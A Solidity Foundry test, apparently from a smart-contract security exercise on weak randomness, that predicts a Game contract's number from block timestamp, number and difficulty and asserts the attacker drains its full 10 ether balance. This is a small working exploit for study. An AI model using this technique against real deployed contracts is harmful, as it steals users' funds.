// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {Game} from "../../src/randomness-vulnerabilities-1/Game.sol";

contract GameTest is Test {

    Game game;

    address userOne = makeAddr("userOne");

    function setUp() public {
        game = new Game();
        vm.deal(address(game), 10 ether);
    }

    function testAttackGame() public {
        vm.startPrank(userOne);
        uint number = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        game.play(number);
        vm.stopPrank();

        // checks all of the funds from contract were stolen
        assertEq(address(game).balance, 0 ether);
        // checks the attack got all the funds
        assertEq(userOne.balance, 10 ether);
    }

}